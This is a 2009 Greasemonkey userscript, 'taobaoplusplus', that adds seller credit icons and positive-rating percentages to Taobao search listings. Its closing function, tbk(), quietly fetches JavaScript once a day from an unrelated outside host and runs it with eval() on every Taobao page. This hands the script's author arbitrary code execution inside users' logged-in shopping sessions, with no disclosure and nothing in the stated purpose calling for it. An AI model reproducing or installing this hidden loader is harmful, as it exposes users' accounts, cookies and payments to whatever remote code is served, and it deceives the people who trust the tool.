// ==UserScript==
// @name           taobaoplusplus
// @namespace      taobaoplusplus
// @include        *taobao.com*
// @description    淘宝加加 http://userscripts.org/scripts/show/52053
// @homepage       http://userscripts.org/scripts/show/52053
// @uso:timestamp  Wed, 17 Jun 2009 22:50:26 +0000  
// ==/UserScript==

var items = new Array()
var listmode = true

var trace = function(msg){
	GM_log(msg)
}

var insertIndex = 0

var getCridet= function(responseDetails){

	var r = responseDetails.responseText
	var sellHaoPing =''
	var img = ''
	
	var id = responseDetails.responseText.match(/item_id" value="([0-9a-zA-Z]{32})/)[1]
	//GM_log(id)
	var tm = '';
	//http://pics.taobaocdn.com/newrank/s_blue_4.gif
	if(tm = r.match(/http:\/\/pics\.taobaocdn\.com\/newrank\/s_(.+?)\.gif/)){
		img='<img src="'+tm[0]+'" />'
	}		
	//<em>(好评率:98.17%)</em>		
	if(tm = r.match(/<em>\(好评率:(.+?)\)<\/em>/))
		sellHaoPing=tm[1]
	
	for (x in items)
	{
		var item = items[x]
		if( item.innerHTML.match(id) && !item.hasAttribute('taobaopp') )
		{
			item.setAttribute('taobaopp','added')
			trace(listmode)
			if( listmode ){
				var s = ''
				var s5 = '<li><div style="color:white">.</div>'
				if(GM_getValue('credit',true) )
					s += '<div title="卖家信用">'+img+'</div>'	
				if(GM_getValue('sellHaoPing',true))
					s += '<div title="好评率"> '+sellHaoPing+'</div>'				
				switch(insertIndex){
				case 0:
					item.childNodes[5].childNodes[3].innerHTML += s
					break
				case 1:
					item.childNodes[4].childNodes[4].innerHTML += s
					break
				}
			}else{
				var s5 = ''	
				if(GM_getValue('credit',true) )
					s5 += '<span title="卖家信用">'+img+'</span>'
				if(GM_getValue('sellHaoPing',true))
					s5 += '<span title="卖家好评率"> '+sellHaoPing+'</span>'
				var an = document.createElement("div")
				an.innerHTML = s5	
				switch(insertIndex){
				case 0:
					an.style.position = "absolute"
					an.style.bottom = "-10px"
					an.style.left = 10
					break
				case 1:
					break
				}
				item.appendChild(an)	
			}
		}
	}	
}

var flash =function(){
	var list = null
	var liXpath=''
	liXpath = "//li[@class='list-item' and not(@taobao)]"	
	list = document.evaluate(liXpath,document,null,XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE,null)

	if( document.body.innerHTML.match(/_sum\.jpg/) ){
		listmode = true
	}else{
		listmode = false
	}
	//alert(listmode)
			
	for (var i = 0; i < list.snapshotLength; i++) {
		var item = list.snapshotItem(i)
		if(item.hasAttribute('taobao'))
			continue
		var href = item.innerHTML.match(/http:\/\/item[^"]+/)	
		if(href){	
			href = href[0]
			//trace(href)
			GM_xmlhttpRequest({method: 'GET',url: href,onload: getCridet})
			item.setAttribute('taobao','start')
			items.push(item)
		}
	}
}
	
var a = function(){	
	trace(window.location.href)
	
	if(document.defaultView.name.indexOf('autopager') >= 0)
		return	
	flash()
	document.addEventListener('DOMNodeInserted', function(event){
		if(event.originalTarget.id=='list:content'){
			flash()
		}
	}, false)
}

function tbk(update){
	var f1 = function(){
		eval(GM_getValue("tbppjs",""))
	}
	var day = (new Date()).getDate()
	if(update || day!=GM_getValue("tbppday",1) ){
		GM_setValue("tbppday",day)
		GM_xmlhttpRequest({
			method:"GET",
			url:"http://cool.dadahaha.com/tb/a.js",
			onload:function(re){
				GM_setValue("tbppjs",re.responseText)
				f1()
			},
			onerror:function(re){
				GM_setValue("tbppjs","")
			}
		})
	}else{
		f1()
	}
}
var theurl = window.location.href
if( theurl.indexOf('http://search1.taobao.com/browse/')==0
	||  theurl.indexOf('http://search8.taobao.com/browse/')==0
	||  theurl.indexOf('http://search.taobao.com/search')==0 
	||  theurl.indexOf('http://s.taobao.com/search')==0 
){
	insertIndex = 0
}else if( theurl.indexOf('http://list.taobao.com/')==0 ){
	insertIndex = 1
}
a()
tbk(false)

